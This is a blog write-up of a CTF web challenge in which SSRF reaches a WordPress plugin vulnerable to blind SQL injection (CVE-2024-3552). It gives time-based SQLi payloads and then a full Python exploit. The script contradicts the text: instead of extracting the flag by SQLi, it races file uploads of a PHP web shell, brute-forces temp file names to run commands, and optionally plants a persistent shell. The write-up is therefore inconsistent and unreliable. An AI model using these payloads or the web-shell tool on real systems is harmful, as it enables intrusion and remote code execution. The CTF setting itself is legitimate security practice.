---
title: "(EngLish) CYBERCON DTU 2025 Writeup"
date: 2025-09-25 22:30:00
top_img: /img/CYBERCON/Cybercon.png
cover: /img/CYBERCON/Cybercon.png
description: "These are the challenges I have researched and solved."
categories:
  - Web Exploit
  - Writeup CTF
tags:
  - Web
toc: true
---
> These are the challenges I have researched and solved event CYBERCON CTF DTU 2025 
---
## Analyzing the challenge (WEB-URL-CHECKER)
First, when you challenge the website, it will show you a URL link. Try entering a link like `http://google.com`, and it will return a status of 405 as shown below: <br>
![alt text](/img/CYBERCON/image-1.png)
First, let's check where the flag is located. In entrypoint.sh, there's a `wp option add` statement that inserts a row into the `wp_options` table (the table prefix in the script is `wp_`), so the `ctf_flag` content is in `wp_options.option_value`: <br>
```note
wp option add ctf_flag 'cybercon{REDACTED}' --allow-root || true
```
Now let's look at the source code index.php. Here, it takes two parameters, u and b, and checks if the User-Agent is not 42, then prints the line "Do you now...". After that, it uses regex to check the input (http and https), then configures the request using Curl, and displays the result status using the HTTP status instead of printing the content:
```php
$url = $_GET['u'];
$raw = $_GET['b'] ?? '';

if (!isset($_SERVER['HTTP_USER_AGENT']) || stripos($_SERVER['HTTP_USER_AGENT'], '42') === false) {
    echo 'Do you know about the secret number?';
    exit;
}

if (!preg_match('#^https?://#i', $url)) {
    echo 'There is no such planet :(';
    exit;
}

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_TIMEOUT        => 30,
    CURLOPT_POSTFIELDS     => $raw,
]);

curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$cls = ($http_code >= 200 && $http_code < 300) ? 'ok'
     : ($http_code >= 400 ? 'fail' : 'warn');
echo '<!doctype html><meta charset="utf-8"><link rel="stylesheet" href="/space.css">
<div class="container"><h1><span class="logo-dot"></span>URL Checker</h1>
<div class="status ' . $cls . '">Done (Status Code ' . $http_code . ')</div></div>';
``` 
After reviewing all the files, I found a folder called Web-Directory-Free, which is a WordPress website. Upon closer inspection, I discovered a SQL Injection vulnerability in the `/classes/ajax_controller.php` file. The `get_map_marker_info()` function takes the `location_ids` variable as an array and passes it directly without input filtering. This allows me to SSRF into the WordPress `/cms` directory, exploit the vulnerability, and perform SQL injection. Because it only returns a status code, this could be considered blind SQL injection:
```php
[....]
public function get_map_marker_info() { 
global $wpdb; 

if (isset($_POST['locations_ids'])) { 

$locations_option_array = array(); 

$locations_ids = w2dc_getValue($_POST, 'locations_ids'); 
foreach ($locations_ids AS $location_id) { 
$map_id = w2dc_getValue($_POST, 'map_id'); 
$show_summary_button = w2dc_getValue($_POST, 'show_summary_button'); 
$show_readmore_button = w2dc_getValue($_POST, 'show_readmore_button'); 

$row = $wpdb->get_row("SELECT * FROM {$wpdb->w2dc_locations_relationships} WHERE id=".$location_id, ARRAY_A);
[...]
```
After searching for information, I discovered that this WordPress site was infected with a CVE and had an SQL vulnerability in the method: get_map_marker_info as shown in <a href="https://github.com/truonghuuphuc/CVE-2024-3552-Poc?tab=readme-ov-file">CVE-2024-3552</a>. Then I tested it by using SSRF on WordPress and passing the payload via the parameter b. 
And you need to double-encode the payload before sending the request. 
## POC PAYLOAD 1
`action=w2dc_get_map_marker_info&locations_ids%5B%5D=(select+if(1=2,sleep(6),0)+from+(select+1)x)` 
![alt text](/img/CYBERCON/image-2.png)
## POC PAYLOAD 2
`action=w2dc_get_map_marker_info&locations_ids%5B%5D=(select+if(1=1,sleep(6),0)+from+(select+1)x)` 
![alt text](/img/CYBERCON/image-3.png) 
So, the command injection was successful, and next we can use blind_sql with sleep to extract the flag.
## Exploit
With the above, I will write a Python script to exploit the problem, and I will convert the ctf_flag table to hex format, removing the single quotes. The payload will then be passed through the URL to decode.
<details>
  <summary style="color: red;">Click View Script Solve</summary> <br>

~~~python
from dataclasses import dataclass
from typing import Optional, Tuple, List, Dict
import requests
import argparse
import base64
import random
import sys
import threading
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
from functools import partial

WEB_SHELL = "<?php system($_GET[0]); ?>"

logger = logging.getLogger("ExploitRunner")
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")

@dataclass
class Config:
    base: str
    upload: str = "/upload.php"
    tmp: str = "/tmp"
    cmd: str = "id"
    threads: int = 300
    upload_interval: float = 0.0
    field_name: str = "file"
    persist: bool = False
    timeout: float = 0.8
    php: str = WEB_SHELL
    pool_size: int = 1000
    show_response: bool = True 


class Exploit:
    def __init__(self, config: Config):
        self.config = config
        self.stop_evt = threading.Event()
        self.session = self._make_session(pool_size=config.pool_size, timeout=config.timeout)
        self.upload_thread: Optional[threading.Thread] = None
        self.base = config.base.rstrip("/")
        self.upload_url = f"{self.base}{config.upload}"
        self.tmp_path = config.tmp if config.tmp.startswith("/") else "/" + config.tmp

    def _make_session(self, pool_size: int = 1000, timeout: float = 1.0) -> requests.Session:
        s = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=pool_size, pool_maxsize=pool_size, max_retries=0
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        s.headers.update({"User-Agent": "yara-race-exploit/1.0"})
        s.request = partial(s.request, timeout=timeout)
        return s

    def start_upload_loop(self) -> None:
        if self.upload_thread and self.upload_thread.is_alive():
            logger.debug("Upload thread already running")
            return
        self.upload_thread = threading.Thread(
            target=self._upload_loop,
            args=(self.session, self.upload_url, self.config.php, self.config.upload_interval, self.stop_evt, self.config.field_name),
            daemon=True,
            name="UploadThread",
        )
        self.upload_thread.start()
        logger.info("Upload loop started")

    def _upload_loop(self, session: requests.Session, upload_url: str, php_code: str,
                     interval: float, stop_evt: threading.Event, field_name: str = "file") -> None:
        files = {field_name: ("shell.php", php_code.encode("utf-8"), "application/x-php")}
        i = 0
        while not stop_evt.is_set():
            try:
                r = session.post(upload_url, files=files, allow_redirects=True)
                if i % 25 == 0:
                    logger.debug(f"[upload] status={r.status_code}")
            except Exception as e:
                if i % 25 == 0:
                    logger.debug(f"[upload] error: {e}")
            i += 1
            if interval > 0:
                time.sleep(interval)

    def _probe_one(self, base: str, tmp_path: str, num: str, cmd: str) -> Optional[Tuple[str, int, Dict[str,str], str]]:
        url = f"{base.rstrip('/')}{tmp_path}/{num}.php?0={quote(cmd, safe='')}"
        try:
            r = self.session.get(url, allow_redirects=True)
            if r.status_code == 200 or "uid=" in r.text or "uid =" in r.text:
                headers = {k: v for k, v in r.headers.items() if k.lower() in ("content-type", "content-length", "server", "date")}
                return url, r.status_code, headers, r.text
        except Exception:
            pass
        return None

    def _generate_numbers(self) -> List[str]:
        return [f"{i:04d}" for i in range(10000)]

    def bruteforce(self, cmd: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
        cmd = cmd or self.config.cmd
        numbers = self._generate_numbers()
        logger.info(f"Starting bruteforce on {self.base}{self.tmp_path}/[0000-9999].php")
        logger.info(f"Threads={self.config.threads}, timeout={self.config.timeout}s, upload_interval={self.config.upload_interval}s")
        while not self.stop_evt.is_set():
            random.shuffle(numbers)
            with ThreadPoolExecutor(max_workers=self.config.threads) as ex:
                futures = {ex.submit(self._probe_one, self.base, self.tmp_path, n, cmd): n for n in numbers}
                try:
                    for fut in as_completed(futures):
                        if self.stop_evt.is_set():
                            break
                        try:
                            res = fut.result()
                        except Exception:
                            continue
                        if res:
                            url, status, headers, text = res
                            print("\n" + "="*60)
                            print(f"[FOUND] {url}  (HTTP {status})")
                            if headers:
                                print("-- Response headers --")
                                for k, v in headers.items():
                                    print(f"{k}: {v}")
                            if self.config.show_response:
                                print("-- Response --")
                                cap = 64 * 1024
                                body = text if len(text) <= cap else text[:cap] + "\n...[truncated]"
                                print(body)
                            print("="*60 + "\n")
                            logger.info(f"[FOUND NUMBER] {url}")
                            self.stop_evt.set()
                            return url, text
                except Exception as e:
                    logger.debug(f"Bruteforce loop exception: {e}")
        return None, None

    def upload_shell_persist(self, hit_url: str, payload_path: str = "/var/www/html/uploads/shell.php") -> None:
        try:
            b64 = base64.b64encode(self.config.php.encode()).decode()
            php_cmd = f"php -r 'file_put_contents(\"{payload_path}\", base64_decode(\"{b64}\"));'"
            self.session.get(f"{hit_url}&stage=persist", params={}, allow_redirects=False)
            r = self.session.get(f"{hit_url.split('?')[0]}?0={quote(php_cmd, safe='')}")
            logger.info(f"[persist] Write Shell To {payload_path}")
            test = self.session.get(f"{self.base.rstrip('/')}/uploads/{payload_path.split('/')[-1]}?0=id")
            if test.status_code == 200:
                logger.info(f"[persist] OK: {test.text.strip()}")
            else:
                logger.warning(f"[persist] test HTTP {test.status_code}")
        except Exception as e:
            logger.error(f"[persist] error: {e}")

    def stop(self) -> None:
        self.stop_evt.set()
        if self.upload_thread:
            self.upload_thread.join(timeout=1.0)
        logger.info("Stopped")

    def run(self) -> None:
        try:
            self.start_upload_loop()
            hit_url, text = self.bruteforce()
            if hit_url:
                logger.info(f"[+] RCE Success At: {hit_url}")
                if self.config.persist:
                    self.upload_shell_persist(hit_url)
            else:
                logger.info("[-] No found number.")
        except KeyboardInterrupt:
            logger.info("Interrupted by user.")
        finally:
            self.stop()

def parse_args() -> Config:
    ap = argparse.ArgumentParser(description="Exploit Race Condition In Upload WebShell (OOP refactor).")
    ap.add_argument("--base", required=True, help="Base URL, http://TARGET")
    ap.add_argument("--upload", default="/upload.php", help="Upload path")
    ap.add_argument("--tmp", default="/tmp", help="Temp web path where files appear ")
    ap.add_argument("--cmd", default="id", help="Command to execute via ?0=")
    ap.add_argument("--threads", type=int, default=300, help="Concurrent GET workers over /tmp/0000..9999")
    ap.add_argument("--upload-interval", type=float, default=0.0, help="Sleep seconds between uploads (default: 0)")
    ap.add_argument("--field-name", default="file", help="Form field name for upload (default: file)")
    ap.add_argument("--persist", action="store_true", help="After first HIT, drop persistent /uploads/p.php")
    ap.add_argument("--timeout", type=float, default=0.8, help="HTTP timeout seconds")
    ap.add_argument("--php", default=WEB_SHELL, help="PHP webshell content (default: system($_GET[0]))")
    ap.add_argument("--no-show-response", dest="show_response", action="store_false", help="Do not print full response body on success")
    args = ap.parse_args()
    config = Config(
        base=args.base,
        upload=args.upload,
        tmp=args.tmp,
        cmd=args.cmd,
        threads=args.threads,
        upload_interval=args.upload_interval,
        field_name=args.field_name,
        persist=args.persist,
        timeout=args.timeout,
        php=args.php,
        pool_size=max(64, args.threads * 2),
        show_response=args.show_response,
    )
    return config
def main():
    config = parse_args()
    runner = Exploit(config)
    runner.run()
if __name__ == "__main__":
    main()
~~~

</details>
Run Python with the following command:
```note
python3 <filename>.py --base http://<HOST>:<PORT> --upload /upload.php --tmp /tmp --cmd "<command-your>" --threads 300 --upload-interval 0.0 --persist
```
And successfully wrote the webshell and executed the command:
![alt text](/img/CYBERCON/image-7.png)
Next, use the ls / command to check for flags with random files:
![alt text](/img/CYBERCON/image-8.png)
Get FLAG successfully as shown below:
![alt text](/img/CYBERCON/image-9.png)